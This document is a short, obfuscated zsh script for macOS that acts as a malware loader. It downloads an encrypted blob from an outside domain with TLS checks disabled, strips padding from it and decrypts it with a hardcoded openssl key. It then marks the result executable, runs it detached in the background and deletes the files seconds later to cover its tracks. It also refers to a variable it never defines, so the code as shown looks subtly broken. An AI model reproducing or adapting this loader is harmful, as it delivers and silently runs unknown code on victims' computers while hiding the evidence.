#!/bin/zsh
ues86=$(mktemp /tmp/cqj42a.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/me09f165880106fa3.bin" -o "$ues86z" || exit 1
qf9z84=$(stat -f %z "$ues86z"); ubbpxh6=$(( qf9z84 - 4064 - 226 ))
tail -c +$(( 4064 + 1 )) "$ues86z" | head -c $ubbpxh6 | openssl enc -d -aes-256-cbc -k 290a875e1c31593538f9d1c0 -out "$ues86" 2>/dev/null
[ -s "$ues86" ] && chmod 700 "$ues86" && ( "$ues86" & ) && disown
( sleep 3; rm -f "$ues86" "$ues86z" ) &>/dev/null &
